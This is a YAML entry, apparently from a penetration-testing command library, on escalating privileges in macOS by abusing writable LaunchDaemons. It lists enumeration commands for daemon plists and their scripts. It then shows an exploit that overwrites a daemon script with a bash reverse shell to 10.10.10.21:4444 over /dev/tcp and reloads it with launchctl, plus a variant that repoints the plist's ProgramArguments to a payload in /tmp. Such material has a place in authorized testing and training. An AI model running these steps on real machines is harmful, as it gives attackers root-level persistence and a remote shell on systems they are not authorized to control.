---
description: |
  Exploit writable LaunchDaemons on macOS to escalate privileges by modifying plist files or replacing the scripts they execute.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Find LaunchDaemons and check permissions
      # ============================================================

      # List LaunchDaemons and check permissions
      ls -la /Library/LaunchDaemons/
      ls -la /System/Library/LaunchDaemons/

      # Find writable LaunchDaemon plists
      find /Library/LaunchDaemons -writable 2>/dev/null

      # Read plist files to find ProgramArguments (the scripts/binaries they run)
      cat /Library/LaunchDaemons/*.plist | grep -A2 ProgramArguments

      # Check permissions on scripts referenced by LaunchDaemons
      # Look for world-writable or group-writable scripts
      for plist in /Library/LaunchDaemons/*.plist; do
        echo "=== $plist ==="
        grep -A3 ProgramArguments "$plist" 2>/dev/null
      done

      # ============================================================
      # EXPLOIT 1: Modify writable script executed by LaunchDaemon
      # ============================================================

      # Check if the script referenced by the plist is writable
      ls -la /opt/scripts/service.sh

      # Backup original script
      cp /opt/scripts/service.sh /opt/scripts/service.sh.bak

      # Inject reverse shell into the script
      echo '#!/bin/bash' > /opt/scripts/service.sh
      echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' >> /opt/scripts/service.sh
      chmod +x /opt/scripts/service.sh

      # Restart the daemon to trigger execution
      sudo launchctl unload /Library/LaunchDaemons/com.vulnerable.service.plist
      sudo launchctl load /Library/LaunchDaemons/com.vulnerable.service.plist

      # Or wait for system reboot if RunAtLoad is true in the plist

      # ============================================================
      # EXPLOIT 2: Modify writable plist file itself
      # ============================================================

      # If the plist itself is writable, change ProgramArguments to your payload
      # Modify the plist to point to your reverse shell script:
      # <key>ProgramArguments</key>
      # <array>
      #   <string>/tmp/reverse.sh</string>
      # </array>

      # Reload the daemon
      sudo launchctl unload /Library/LaunchDaemons/com.vulnerable.service.plist
      sudo launchctl load /Library/LaunchDaemons/com.vulnerable.service.plist
phase:
  - PrivEsc
target_os:
  - macOS
services: []
techniques:
  - LaunchDaemon_Abuse
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-persistence
---
